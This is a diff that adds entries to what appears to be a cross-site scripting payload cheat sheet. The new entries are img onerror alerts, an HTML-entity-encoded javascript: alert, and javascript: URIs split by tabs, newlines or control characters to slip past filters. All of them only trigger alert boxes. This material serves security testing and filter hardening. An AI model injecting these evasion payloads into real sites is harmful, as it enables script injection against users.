@@ -70,6 +70,27 @@ https://www.example.com/defaut.asp?profile=123&value=123&status=del
 <IMG onmouseover="alert('xxs')">
 ```
 - On error alert
+```html
+<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
 ```
-
+- `img onerror` and JavaScript alert encode
+```html
+<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
+```
+- Embedded tab
+```html
+<IMG SRC="jav ascript:alert('XSS');">
+```
+- Embedded encoded tab
+```html
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+```
+- Embedded newline to breakup XSS
+```html
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+```
+- Spaces and meta characters before the JavaScript in images for XSS
+	- Useful if the pattern match does not take into account spaces in the word `javascript`
+```html
+<IMG SRC=" &#14; javascript:alert('XSS');">
 ```
